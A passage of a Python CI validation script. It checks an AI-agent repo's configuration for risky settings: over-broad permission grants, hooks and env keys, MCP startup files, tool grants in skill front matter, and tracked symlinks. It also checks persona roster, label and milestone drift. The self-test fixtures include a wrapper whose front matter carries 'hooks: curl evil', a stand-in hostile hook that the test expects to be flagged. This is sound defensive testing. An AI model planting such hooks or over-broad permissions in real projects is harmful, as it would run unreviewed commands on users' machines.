    name: str, offline: bool, fetch, require_remote: bool
) -> "tuple[Result | None, object]":
    """Handle the offline/skip/require-remote plumbing common to the remote API checks.

    Returns (early_result, payload). When early_result is not None the caller should use it
    directly (the remote data is unavailable); otherwise payload holds the fetched data.

    A remote check that cannot RUN (gh missing / API error) is reported with the ``skip``
    status — never ``fail`` — so a gh/API OUTAGE is not miscounted as roster drift. Under
    ``--require-remote`` that skip is escalated to a hard **exit 2** ("could not run —
    remote unavailable") by ``main``, distinct from drift (exit 1).
    """
    if offline:
        return Result(name, "skip", ["--offline: remote lookup skipped"]), None
    ok, payload, err = fetch()
    if not ok:
        detail = (
            f"could not run (remote unavailable): {err}"
            if require_remote
            else f"skipped: {err}"
        )
        return Result(name, "skip", [detail]), None
    return None, payload


def settings_result(path: str) -> Result:
    """Wrap :func:`validate_settings` as a reportable check ("settings-permissions")."""
    problems = validate_settings(path)
    detail = [
        f"{path}: allow/deny are string lists; no allow entry matches (case-insensitively) "
        f"the {len(FORBIDDEN_ALLOW_COMMANDS)} mutating git/gh prefixes in "
        f"FORBIDDEN_ALLOW_COMMANDS and none is a wildcard/glob or tool-wide Bash grant; no "
        f"defaultMode outside default/plan; only 'permissions' (plus `$schema` and the "
        f"{len(ALLOWED_TOP_LEVEL_KEYS) - 2} inert keys) at top level and only "
        f"allow/deny/defaultMode inside it, so no "
        f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
        f"additionalDirectories; {len(REQUIRED_DENY_ENTRIES)} required deny entries present. "
        f"Other allow entries are not policed."
    ]
    return Result("settings-permissions", "fail" if problems else "pass", problems or detail)


def command_skill_result(commands_dir: str, skills_dir: str) -> Result:
    """Wrap :func:`scan_command_skill_frontmatter` as the "command-skill-frontmatter" check.

    Local and stdlib-only like `settings-permissions` — its one subprocess is a `git ls-files`
    query in the checkout, not a network call — so it runs identically offline and in CI, and
    the passing detail line reports HOW MANY files were covered. A skills tree that yields zero
    manifests FAILS the check (the repo tracks .claude/skills), so a rename that empties the
    scan reddens the gate instead of passing with "0 scanned".

    Status is ``skip`` — with the reason — when git could not be asked whether either tree
    holds a TRACKED SYMLINK (FINAL-CERT F1): the walk alone cannot rule one out, because a
    link that dangles here resolves wherever its target exists. Under ``--require-remote``
    (CI) `main` turns that skip into exit 2.
    """
    problems, commands, skills = scan_command_skill_frontmatter(commands_dir, skills_dir)
    # Ask GIT as well as the filesystem: a tracked link under either tree whose target is
    # absent in this checkout is invisible to the walk above (FINAL-CERT F1).
    link_problems, link_unverified, link_notes = tracked_symlink_problems(
        link_query_paths(commands_dir, skills_dir)
    )
    # Git's verdict first (it names the index mode and is decisive), then the walk's — one
    # link reported by both questions is ONE finding, so the spellings are compared as
    # top-level-relative paths rather than as message strings (LAST-CERT F4).
    problems = _dedupe_link_problems(link_problems, problems)
    # The repo TRACKS .claude/skills, so a vanished or empty skills tree is drift, not "0
    # scanned, pass": a directory rename (this PR itself moved .github/skills there) must
    # redden the gate rather than silently reduce coverage to nothing. .claude/commands
    # stays optional because nothing tracked lives there yet.
    if skills == 0:
        problems = problems + [
            f"no SKILL.md manifest found under {skills_dir!r} — the repo tracks its skills "
            f"there, so an empty or missing skills tree means the scan covered nothing "
            f"(directory moved or renamed?); fix the path or pass --skills-dir"
        ]
    detail = [
        f"{skills} skill manifest(s) under {skills_dir} and {commands} slash-command file(s) "
        f"under {commands_dir} scanned: strict front-matter parse, no "
        f"{'/'.join(FORBIDDEN_COMMAND_SKILL_KEYS)}, no unknown key (commands may carry only "
        f"{', '.join(ALLOWED_COMMAND_KEYS)}; skills also 'name')"
    ] + link_notes
    if problems:
        return Result(
            "command-skill-frontmatter",
            "fail",
            problems,
            notes=_fail_notes(detail, link_unverified),
        )
    if link_unverified:
        # "Could not look for tracked links" is not "there are none": SKIP with the reason,
        # which --require-remote turns into exit 2 in CI.
        return Result("command-skill-frontmatter", "skip", link_unverified, notes=detail)
    return Result("command-skill-frontmatter", "pass", detail)


def startup_config_result(
    mcp_path: str, settings_local_path: str, settings_path: "str | None" = None
) -> Result:
    """Wrap :func:`validate_startup_config` as the "tracked-startup-config" check.

    Local and stdlib-only (it shells only to `git ls-files`, argv form, in the checkout), so
    it runs identically offline and in CI. Beyond the tracking question, the three paths — and
    the directory they live in — are checked for TRACKED SYMLINKS by git index mode `120000`,
    which is the only way to see a link whose target is absent in this checkout but present on
    the machine that committed it (FINAL-CERT F1); `settings_path` is derived from
    `settings_local_path` when the caller does not pass it, so a redirected fixture never
    drags the real checkout's settings.json into a foreign tree's query.

    Status is ``skip`` — with the reason on the line — when a file is present but its tracking
    (or the symlink question) could not be determined: an unanswerable question must read as
    unanswered, not as clean. Under ``--require-remote`` (CI) `main` turns that skip into a
    hard exit 2, so CI can never go green on an unverified startup surface.
    """
    problems, notes, unverified = validate_startup_config(mcp_path, settings_local_path)
    if settings_path is None:
        # Derived, never defaulted to the repo path: a fixture that redirects the pair must
        # not drag the real checkout's settings.json into a foreign tree's git query.
        directory = os.path.dirname(settings_local_path)
        settings_path = os.path.join(directory, "settings.json") if directory else "settings.json"
    # The three files are ALSO asked about by git: a tracked symlink at any of them is
    # configuration the CLI resolves and this gate cannot read (FINAL-CERT F1). The directory
    # they live in (`.claude/`) is link-checked directly — if it is the link, git records one
    # 120000 entry for the directory and none for the files inside it.
    link_problems, link_unverified, link_notes = tracked_symlink_problems(
        link_query_paths(mcp_path, settings_local_path, settings_path)
    )
    notes = notes + link_notes
    settings_dir = os.path.dirname(settings_path)
    if settings_dir and os.path.islink(settings_dir):
        # An UNTRACKED `.claude` symlink: git's index says nothing about it, but the CLI
        # still resolves it and this gate still cannot read through it. Keyed by path like
        # the index findings, so a link that is BOTH tracked and present prints once.
        link_problems = link_problems + [
            (settings_dir, _symlink_problem("settings", settings_dir))
        ]
    # De-duplicated: a tracked link at `.mcp.json` is seen both by the per-file tracking
    # question above and by this git-mode query, and one finding must read as one line —
    # even when the caller spells `--mcp-config` absolutely and git answers repo-root
    # relative, which string comparison could not match (LAST-CERT F4). Git's verdict is
    # listed first so the surviving line is the one naming the index mode.
    problems = _dedupe_link_problems(link_problems, problems)
    unverified = unverified + link_unverified
    if problems:
        return Result(
            "tracked-startup-config", "fail", problems, notes=_fail_notes(notes, unverified)
        )
    if unverified:
        return Result("tracked-startup-config", "skip", unverified, notes=notes)
    return Result("tracked-startup-config", "pass", notes)


def run_checks(args: argparse.Namespace) -> "list[Result]":
    repo = resolve_repo(args.repo, args.offline)
    ref = resolve_ref(args.ref)
    _log(f"Reconciling roster ↔ labels for repo: {repo}")
    if ref:
        _log(f"CODEOWNERS validated at ref: {ref}")
    _log("")

    try:
        roster, integrity, policed = read_roster(args.agents_dir)
    except FileNotFoundError as exc:
        linked_roots = linked_agents_root_problems(args.agents_dir)
        if not linked_roots:
            raise
        # The roster is empty BECAUSE `.claude` (or `.claude/agents`) is a tracked link or
        # submodule. That is repo DRIFT the roster check owns — reportable as a failed check
        # and exit 1 — not the exit-2 "this environment could not be interrogated" the bare
        # raise produced, which reads as an outage and invites a retry-until-green (F-A).
        roster, integrity, policed = set(), [str(exc)], 0
    _log(f"Roster: {len(roster)} persona wrapper(s) under {args.agents_dir}")

    taxonomy_text = ""
    if os.path.exists(args.taxonomy):
        with open(args.taxonomy, "r", encoding="utf-8") as handle:
            taxonomy_text = handle.read()
    else:
        _warning(f"label taxonomy {args.taxonomy!r} not found — truncations cannot be verified")

    # The committed persona-label list is the OFFLINE source of truth for the roster↔label
    # check, so it is required: a missing/empty block is a data error (exit 2 via main), not
    # drift. This is what lets --offline catch a removed/added agent without the live labels.
    documented_labels = parse_documented_persona_labels(taxonomy_text)

    results: "list[Result]" = []

    # --- Check 1a: roster <-> DOCUMENTED persona labels (local; runs even with --offline) ---
    # Catches a persona added/removed vs the taxonomy the project commits. Local roster
    # integrity problems ride along here (this check always runs).
    problems, allowed = reconcile_roster_labels(roster, documented_labels, taxonomy_text)
    # A tracked symlink under the agents tree is roster integrity too: git sees the link
    # (mode 120000) whether or not it resolves in this checkout (FINAL-CERT F1).
    link_problems, link_unverified, link_notes = tracked_symlink_problems(
        link_query_paths(args.agents_dir)
    )
    problems = _dedupe_link_problems(link_problems, integrity, problems)
    detail = [
        f"{len(roster)} roster slug(s), {len(documented_labels)} documented persona "
        f"label(s) in {os.path.basename(args.taxonomy)}",
        f"front-matter policy applied to {policed} top-level wrapper(s): strict front-matter "
        f"parse, permissionMode in {'/'.join(ALLOWED_AGENT_PERMISSION_MODES)}, no "
        f"{'/'.join(FORBIDDEN_AGENT_KEYS)}, no unknown key",
    ]
    for slug, trunc in allowed:
        detail.append(f"allowed documented truncation: {slug} -> {PERSONA_PREFIX}{trunc}")
    detail.extend(link_notes)
    if problems:
        results.append(
            Result(
                "roster<->documented-labels",
                "fail",
                problems,
                notes=_fail_notes(detail, link_unverified),
            )
        )
    elif link_unverified:
        results.append(Result("roster<->documented-labels", "skip", link_unverified, notes=detail))
    else:
        results.append(Result("roster<->documented-labels", "pass", detail))

    # --- Check 4: .claude/settings.json permission surface (local; runs even --offline) ---
    # Placed before the remote checks so a malformed/over-broad permission file fails fast.
    results.append(settings_result(args.settings))

    # --- Check 4b: tracked startup configuration (local; runs even with --offline) --------
    # `.mcp.json` spawns its servers at CLI LAUNCH and `.claude/settings.local.json` is
    # honored like settings.json — two surfaces the settings policy above never opens.
    results.append(
        startup_config_result(
            args.mcp_config, settings_local_path(args.settings), args.settings
        )
    )

    # --- Check 5: .claude/commands + .claude/skills front matter (local; runs --offline) ---
    # The third front-matter surface Claude Code reads as configuration. `allowed-tools:` in
    # a tracked slash-command or SKILL.md file runs a tool with no prompt, and neither the
    # settings policy nor the wrapper policy above can see it.
    results.append(command_skill_result(args.commands_dir, args.skills_dir))

    # --- Check 1b: roster <-> LIVE persona labels (remote; catches GitHub UI-side drift) ---
    early, labels = _remote_or_skip(
        "roster<->live-labels", args.offline, lambda: fetch_persona_labels(repo), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems, allowed = reconcile_roster_labels(roster, labels, taxonomy_text)
        detail = [f"{len(roster)} roster slug(s), {len(labels)} live persona label(s)"]
        for slug, trunc in allowed:
            detail.append(f"allowed documented truncation: {slug} -> {PERSONA_PREFIX}{trunc}")
        results.append(
            Result("roster<->live-labels", "fail" if problems else "pass", problems or detail)
        )

    # --- Check 2: CODEOWNERS parse errors (validated at the PR head/merge ref when in CI) ---
    early, errors = _remote_or_skip(
        "codeowners-errors", args.offline, lambda: fetch_codeowners_errors(repo, ref), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems = check_codeowners_errors(errors)
        if problems:
            results.append(Result("codeowners-errors", "fail", problems))
        else:
            scope = f"ref {ref}" if ref else "default branch"
            results.append(Result("codeowners-errors", "pass", [f"0 CODEOWNERS errors ({scope})"]))

    # --- Check 3: milestone dropdown <-> live milestones ---
    form_options = parse_milestone_options_from_file(args.feature_form)
    early, live_titles = _remote_or_skip(
        "milestone-dropdown", args.offline, lambda: fetch_milestones(repo), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems = check_milestones(form_options, live_titles)
        detail = [f"{len(form_options)} dropdown option(s), {len(live_titles)} live milestone(s)"]
        results.append(
            Result("milestone-dropdown", "fail" if problems else "pass", problems or detail)
        )

    return results


def parse_milestone_options_from_file(path: str) -> "list[str]":
    if not os.path.exists(path):
        raise FileNotFoundError(f"feature-request form {path!r} not found")
    with open(path, "r", encoding="utf-8") as handle:
        return parse_milestone_options(handle.read())


def _print_summary(results: "list[Result]") -> None:
    _log("")
    _log("Reconciliation summary")
    _log("----------------------")
    symbol = {"pass": "PASS", "fail": "FAIL", "skip": "SKIP"}
    for result in results:
        _log(f"[{symbol[result.status]}] {result.name}")
        for line in result.lines:
            _log(f"       - {line}")
            if result.status == "fail":
                _error(f"{result.name}: {line}")
            elif result.status == "skip":
                _warning(f"{result.name}: {line}")
        for note in result.notes:
            # Context, not verdict: printed for the reader, never annotated (FINAL-CERT F5).
            _log(f"       - {note}")


# --- Self-test ---------------------------------------------------------------------------

# How many assertions `--selftest` executes when it runs from the ROOT of the git checkout
# with every fixture available (the CI job and a normal developer run). It is asserted at the
# end of the run, because a selftest that silently executes FEWER assertions than it used to
# is indistinguishable from one that still covers everything. Bump it deliberately when an
# assertion is added or removed.
#
# What the floor actually enforces, in each mode (PR-901 fourth round, Q1/F2):
#   * ALWAYS — every checkout-only assertion ran wherever `in_checkout` says it could, and,
#     when NOTHING was skipped inside a checkout, the executed count is exactly
#     SELFTEST_ASSERTIONS_IN_CHECKOUT.
#   * DEVELOPER (the default) — a skipped fixture group (no `git archive`, no symlink
#     privilege, a TMPDIR inside a checkout) or reduced coverage relaxes the count floor and
#     is reported in the closing line instead. That keeps a laptop run useful, and it is why
#     the count ALONE cannot catch "a guard added to the wrong block" or "a fixture group
#     that stopped building": both of those SKIP, and a skip disarms the count.
#   * STRICT (`--require-full-coverage`, which the reconcile workflow passes and which
#     GITHUB_ACTIONS/CI default on) — those two escapes become failures in their own right:
#     any skip, and any reduced coverage, FAILS the floor and names what was skipped. So an
#     automated run either executes the full count or goes red; it cannot go green with less.
SELFTEST_ASSERTIONS_IN_CHECKOUT = 327
# The assertions that can only run there (they exercise the REAL .claude tree through main()).
# Anywhere else — a `git archive` export, a tarball, a vendored copy, a subdirectory — they
# are skipped rather than failed, so the floor below is what proves they ran where they can.
SELFTEST_CHECKOUT_ONLY_ASSERTIONS = 3


def _selftest(strict: bool = False) -> int:
    failures: "list[str]" = []
    # Fixture repositories are BUILT and STAGED between queries in this one process, which no
    # real run does; the `_ls_files` cache is exercised by its own assertion below instead.
    globals()["_LS_FILES_CACHE_ENABLED"] = False
    # Executed/skipped tallies, so the closing line reports what this run actually covered
    # rather than an unqualified "all assertions passed" (PR-901 third round, L1/Info-2/3).
    tally = {"executed": 0, "skipped": 0, "checkout_only": 0}
    skipped_reasons: "list[str]" = []
    # Can this process see the REAL `.claude` tree through git? Two conditions, asked once so
    # every assertion below agrees about which environment it is in: the run is at the repo
    # root (`.claude/agents` and the taxonomy are where the defaults say), and git can answer
    # about `.claude` — the same probe the fixtures use, where `_tracked_links` returns None
    # only when git could not answer at all. A `git archive` export, a tarball, a vendored
    # copy or a run from a subdirectory fails one of them and gets REDUCED coverage.
    at_repo_root = os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY)
    in_checkout = (
        at_repo_root
        and _tracked_links([os.path.join(os.getcwd(), CLAUDE_DIR_NAME)]) is not None
    )
    # WHY coverage is reduced, decided once and reused by every message that reports it. The
    # probe already distinguishes the two causes and they send a reader to different fixes:
    # "git is not on PATH" is fixed by installing git, "not a git checkout at the repo root"
    # by running from a checkout — and reporting the first as the second sent readers who had
    # a perfectly good checkout looking for one (PR-901 fourth round, Info-2).
    coverage_gap = ""
    if not in_checkout:
        coverage_gap = (
            "git is not on PATH"
            if shutil.which("git") is None
            else "not a git checkout at the repo root"
        )
    # STRICT mode, requested by `--require-full-coverage` (which the reconcile workflow
    # passes explicitly — the flag, not the environment, is the contract) and defaulted on
    # under `GITHUB_ACTIONS`/`CI` so an automated run that forgets it still cannot go green
    # with less. A developer on a machine without `git archive`, without symlink privilege
    # or with TMPDIR inside a checkout gets counted SKIPs and exit 0; an automated run must
    # not, because there a skipped fixture group and a fixture group that stopped building
    # are indistinguishable (PR-901 fourth round, Q1/F2).
    strict = strict or bool(os.environ.get("GITHUB_ACTIONS") or os.environ.get("CI"))

    def check(condition: bool, label: str) -> None:
        tally["executed"] += 1
        if condition:
            _log(f"  ok  - {label}")
        else:
            failures.append(label)
            _log(f" FAIL - {label}")

    def skip(reason: str) -> None:
        """Record a fixture group this environment cannot run, and say so in the tally."""
        tally["skipped"] += 1
        skipped_reasons.append(reason)
        _log(f"  skip - {reason}")

    def needs(available: bool, reason: str) -> bool:
        """Guard a fixture group on an environment condition, COUNTING the skip if absent.

        A bare `if os.path.isdir(...)` guard silently dropped its assertions from any run
        that is not at the repo root, so the closing line's skip count claimed full coverage
        while dozens of assertions had never executed (PR-901 fourth round, I1/Info-1). Every
        such guard reports through here instead, which is also what makes the strict floor
        able to see the loss.
        """
        if not available:
            skip(reason)
        return available

    def check_in_checkout(condition: bool, label: str) -> None:
        """`check`, but only where the real `.claude` tree can be asked about.

        Outside a checkout git cannot answer, the local checks SKIP by design, and asserting
        a PASS here would turn a correct fail-closed answer into a red selftest — while a
        bare `if` would let the run go green with the assertion silently gone. So it is
        skipped loudly and counted: the floor at the end of `_selftest` requires all
        :data:`SELFTEST_CHECKOUT_ONLY_ASSERTIONS` of them to have run wherever `in_checkout`
        says they could (PR-901 third round, L1/Info-2/3).
        """
        if not in_checkout:
            skip(f"{coverage_gap}: {label}")
            return
        tally["checkout_only"] += 1
        check(condition, label)

    doc = (
        "GitHub caps label names at 50 characters. "
        "`persona:dotnet-vectorized-columnar-compute-engineer` is 51 characters, so its "
        "label drops the redundant trailing `-engineer`: "
        "`persona:dotnet-vectorized-columnar-compute`."
    )
    long_slug = "dotnet-vectorized-columnar-compute-engineer"
    trunc = "dotnet-vectorized-columnar-compute"

    check(derive_truncated_label(long_slug) == trunc, "derive_truncated_label drops -engineer")
    check(derive_truncated_label("product-manager") is None, "derive returns None for short slug")
    check(truncation_documented(doc, long_slug, trunc), "documented truncation recognized")
    check(
        not truncation_documented("no mention here", long_slug, trunc),
        "undocumented truncation rejected",
    )

    # Clean reconciliation with the one documented truncation.
    roster = {"product-manager", long_slug}
    labels = {"product-manager", trunc}
    problems, allowed = reconcile_roster_labels(roster, labels, doc)
    check(problems == [] and allowed == [(long_slug, trunc)], "clean roster reconciles (0 drift)")

    # Undocumented truncation must fail.
    problems, _ = reconcile_roster_labels(roster, labels, "nothing documented")
    check(len(problems) >= 1, "undocumented truncation flagged as drift")

    # Extra label / missing label.
    problems, _ = reconcile_roster_labels({"a"}, {"a", "b"}, doc)
    check(any("persona:b" in p for p in problems), "extra label flagged")
    problems, _ = reconcile_roster_labels({"a", "c"}, {"a"}, doc)
    check(any("'c'" in p for p in problems), "missing label flagged")

    # Dropdown parser + milestone check.
    form_yaml = (
        "  - type: dropdown\n"
        "    id: milestone\n"
        "    attributes:\n"
        "      label: Target roadmap milestone\n"
        "      options:\n"
        '        - "M1 — Engine foundations (v0.1)"\n'
        '        - "M2 — Storage & SQL (v0.x)"\n'
        '        - "Unsure / needs triage"\n'
        "    validations:\n"
        "      required: true\n"
        "  - type: textarea\n"
        "    id: personas\n"
    )
    options = parse_milestone_options(form_yaml)
    check(
        options == ["M1 — Engine foundations (v0.1)", "M2 — Storage & SQL (v0.x)", "Unsure / needs triage"],
        "milestone options parsed (quotes + sentinel)",
    )
    live = ["M1 — Engine foundations (v0.1)", "M2 — Storage & SQL (v0.x)"]
    check(check_milestones(options, live) == [], "dropdown matches live milestones (+sentinel)")
    check(
        any("missing" in p for p in check_milestones(options, live + ["M3 — X"])),
        "missing live milestone flagged",
    )
    check(
        any("stale" in p for p in check_milestones(options + ["M9 — Ghost"], live)),
        "stale dropdown option flagged",
    )

    # --- Finding 5: an over-long truncation (the truncated label itself > 50 chars) is refused.
    over_base = "x" * (GITHUB_LABEL_MAX - len(PERSONA_PREFIX) + 1)  # persona:<over_base> is 51 chars
    over_long_slug = over_base + TRUNCATION_SUFFIX
    check(
        len(PERSONA_PREFIX + over_base) > GITHUB_LABEL_MAX
        and derive_truncated_label(over_long_slug) is None,
        "derive_truncated_label rejects a truncation that would still exceed 50 chars",
    )

    # --- Finding 1: the CODEOWNERS parse-error check must FAIL on an error fixture and PASS
    # clean. (A mutation that suppresses codeowners/errors must redden, not stay green.)
    dirty_codeowners = [
        {"path": "CODEOWNERS", "line": 3, "kind": "Unknown owner",
         "message": "@nobody is not a valid owner"}
    ]
    check(len(check_codeowners_errors(dirty_codeowners)) >= 1, "CODEOWNERS parse error flagged (fails)")
    check(check_codeowners_errors([]) == [], "clean CODEOWNERS reconciles (passes)")

    # --- Finding 4: codeowners/errors is pinned to a ref (PR head), not always the default.
    check(
        codeowners_errors_endpoint("o/r", None) == "repos/o/r/codeowners/errors",
        "codeowners endpoint without ref → default branch",
    )
    check(
        codeowners_errors_endpoint("o/r", "abc123") == "repos/o/r/codeowners/errors?ref=abc123",
        "codeowners endpoint pins ref (PR head)",
    )
    check(
        "%2F" in codeowners_errors_endpoint("o/r", "refs/pull/5/merge"),
        "codeowners endpoint url-encodes a ref path",
    )

    # --- Finding 2: --offline reconciles the roster against the DOCUMENTED persona labels
    # committed to label-taxonomy.md, so a removed/added agent is caught with no network.
    taxonomy_block = (
        "prose about persona labels\n"
        "<!-- BEGIN persona-labels -->\n"
        "```text\n"
        "persona:product-manager\n"
        f"persona:{trunc}\n"
        "```\n"
        "<!-- END persona-labels -->\n"
    ) + doc  # `doc` records the full long slug + standalone trunc, so the truncation is allowed
    documented = parse_documented_persona_labels(taxonomy_block)
    check(documented == {"product-manager", trunc}, "documented persona labels parsed from taxonomy block")
    problems, allowed = reconcile_roster_labels({"product-manager", long_slug}, documented, taxonomy_block)
    check(
        problems == [] and allowed == [(long_slug, trunc)],
        "offline roster<->documented-labels reconciles (0 drift)",
    )
    problems, _ = reconcile_roster_labels({long_slug}, documented, taxonomy_block)
    check(
        any("product-manager" in p for p in problems),
        "offline catches a removed agent vs documented labels",
    )
    _block_missing_raised = False
    try:
        parse_documented_persona_labels("no markers, no block here")
    except ValueError:
        _block_missing_raised = True
    check(_block_missing_raised, "missing persona-labels block raises (offline coverage can't silently vanish)")

    # --- Finding 7b: an undocumented-but-PRESENT truncation is ONE problem (roster-side), not
    # also a duplicate stale-label problem for the same truncated label.
    problems, _ = reconcile_roster_labels({long_slug}, {trunc}, "nothing documented")
    check(any("not recorded" in p for p in problems), "undocumented present truncation → roster-side problem")
    check(
        not any("delete the stale label" in p for p in problems),
        "paired stale-label message suppressed (no double count)",
    )
    check(len(problems) == 1, "undocumented present truncation emits exactly one problem")

    # --- R1-F3/F4: read_roster itself is exercised (it was previously untested, so a
    # reverted glob could leave --selftest green while --offline exited 2). Fixtures are
    # stdlib-only temp dirs; "is a persona wrapper" must be decided by the front-matter
    # `name:`, NOT by the filename shape.
    def _wrapper(directory: str, filename: str, body: str) -> None:
        with open(os.path.join(directory, filename), "w", encoding="utf-8") as handle:
            handle.write(body)

    def _read_roster_safe(directory: str) -> "tuple[bool, set[str], list[str]]":
        """read_roster that records ANY raise as a FAILURE instead of escaping as a traceback.

        Every read_roster fixture below funnels through here so a mutation that makes
        read_roster raise — FileNotFoundError (nothing matched), or anything else (an
        OSError from a broken walk, a TypeError from a bad edit) — yields FAIL lines from
        --selftest rather than an unhandled traceback that obscures which assertions were
        meant to hold. The exception TYPE NAME is returned as the problem so the FAIL line
        still says what went wrong.
        """
        try:
            slugs, problems, _policed = read_roster(directory)
        except Exception as exc:  # noqa: BLE001 - selftest harness: report, never propagate
            return (False, set(), [type(exc).__name__])
        return (True, slugs, problems)

    # (a) Two well-formed `<slug>.md` wrappers → both slugs, zero problems. This assertion is
    # what fails if the scan is narrowed back to `*.agent.md` (nothing would be found and
    # read_roster would raise FileNotFoundError).
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\nbody\n")
        _wrapper(tmp, "release-manager.md", "---\nname: release-manager\ndescription: x\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok
            and roster_slugs == {"product-manager", "release-manager"}
            and roster_problems == [],
            "read_roster finds `<slug>.md` wrappers by front-matter name (0 problems)",
        )

    # (b) front-matter `name:` != filename stem → exactly one integrity problem.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: prodcut-manager\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok and len(roster_problems) == 1 and "does not match its" in roster_problems[0],
            "read_roster flags front-matter name != filename stem",
        )

    # (c) Plain markdown with NO front-matter fence (a README) is ignored, not counted as a
    # slug — but a file that OPENS a fence is a persona CANDIDATE, so a fence with no `name:`
    # is fail-closed drift, not a silent skip (VERIFY-F1 rule 4). Killing mutant: dropping the
    # "fence but no name" branch, which restores the bucket every unreadable spelling fell
    # into. The 25 real wrappers all carry a `name:`, and no README/template in
    # `.claude/agents/` opens a fence, so this costs no false positive.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "README.md", "# Agents\n\nThis folder holds persona wrappers.\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok and roster_slugs == {"product-manager"} and roster_problems == [],
            "read_roster ignores fence-less markdown (README) — no false positive",
        )
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "TEMPLATE.md", "---\ndescription: no name key\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok
            and roster_slugs == {"product-manager"}
            and len(roster_problems) == 1
            and "TEMPLATE.md" in roster_problems[0]
            and "declares no `name:`" in roster_problems[0],
            "read_roster fails closed on a fenced wrapper with no `name:` (names the file)",
        )

    # (d) A directory with no persona wrapper at all is a hard data error, not an empty pass.
    _empty_raised = False
    with tempfile.TemporaryDirectory() as tmp:
        try:
            read_roster(tmp)
        except FileNotFoundError:
            _empty_raised = True
    check(_empty_raised, "read_roster raises FileNotFoundError when no persona wrapper exists")

    # (e) R2-F5a/b: two files declaring the SAME front-matter `name:` (the realistic
    # collision: a canonical `<slug>.md` wrapper plus a copy under another filename) →
    # EXACTLY ONE duplicate problem, and it names BOTH paths. Without the both-paths
    # message the report would finger only the file encountered second, which for this
    # fixture is the canonical wrapper — the innocent one. A mutation deleting the
    # duplicate branch must redden here.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "copy-of-pm.md", "---\nname: product-manager\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _dupes = [p for p in roster_problems if "duplicate persona slug" in p]
        check(
            _ok and len(_dupes) == 1,
            "read_roster flags a duplicate persona slug exactly once",
        )
        check(
            len(_dupes) == 1
            and "copy-of-pm.md" in _dupes[0]
            and "product-manager.md" in _dupes[0],
            "duplicate-slug message names BOTH declaring files (not just the second)",
        )

    # (f) R2-F5c/R3-F3: a `name:`-bearing wrapper NESTED below agents_dir is an integrity
    # error, not a silent no-op. The workflow path filter (`.claude/agents/**`) is recursive,
    # so a flat scan here would ship an agent this gate never saw. The roster still counts
    # only the top-level wrapper. A mutation flattening the walk must redden here.
    #
    # The `.hidden/` fixture pins the os.walk-vs-glob choice: `glob.glob(**)` SKIPS
    # dot-prefixed directories, so reverting to glob leaves `.hidden/h.md` unseen while
    # `.claude/agents/**` would still ship it. That mutant must redden the second assertion.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        os.makedirs(os.path.join(tmp, ".hidden"), exist_ok=True)
        _wrapper(os.path.join(tmp, ".hidden"), "h.md",
                 "---\nname: hidden-persona\nhooks: curl evil\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested = [p for p in roster_problems if "is nested" in p]
        check(
            _ok and len(_nested) == 2 and any("nested.md" in p for p in _nested),
            "read_roster flags a nested persona wrapper as an integrity problem",
        )
        check(
            _ok and any(os.path.join(".hidden", "h.md") in p for p in _nested),
            "read_roster scans DOT-prefixed subdirs too (os.walk, not glob)",
        )
        check(
            _ok and roster_slugs == {"product-manager"},
            "nested wrapper is NOT counted as a roster entry (roster stays flat)",
        )
        # A nested wrapper is not a roster entry, but it IS shipped by the workflow path
        # filter, so the front-matter policy must run on it too. `.hidden/h.md` carries a
        # `hooks:` key: if the policy call on the nested branch is dropped (the mutant), the
        # wrapper is reported only as "nested" and its hook sails through unnamed.
        check(
            _ok
            and any(
                "'hooks'" in p and os.path.join(".hidden", "h.md") in p
                for p in roster_problems
            ),
            "a nested wrapper's forbidden key is policed too (nesting is not an amnesty)",
        )

    # (f2) R3-F3: an agents dir whose ONLY wrappers are nested must not read as "empty" — the
    # FileNotFoundError has to name the nested wrapper, or the operator is told to add an
    # agent that is already there (one level too deep).
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        _nested_only_msg = ""
        try:
            read_roster(tmp)
        except FileNotFoundError as exc:
            _nested_only_msg = str(exc)
        check(
            "nested.md" in _nested_only_msg and "found and ignored" in _nested_only_msg,
            "nested-only agents dir names the ignored nested wrapper in the raised message",
        )

    # (f2b) RS-F1a: the policy runs on a nested wrapper whether or not it has a `name:`.
    # Both spellings matter operationally: `name:`-less nested files are the ones a flat
    # reader dismissed as "not a persona" while the recursive `.claude/agents/**` path filter
    # still shipped them. Killing mutant for both: replacing the nested branch's
    # `problems.extend(validate_agent_frontmatter(...))` with a bare `continue`.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "n.md", "---\nhooks: curl evil\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested_rel = os.path.join("sub", "n.md")
        check(
            _ok
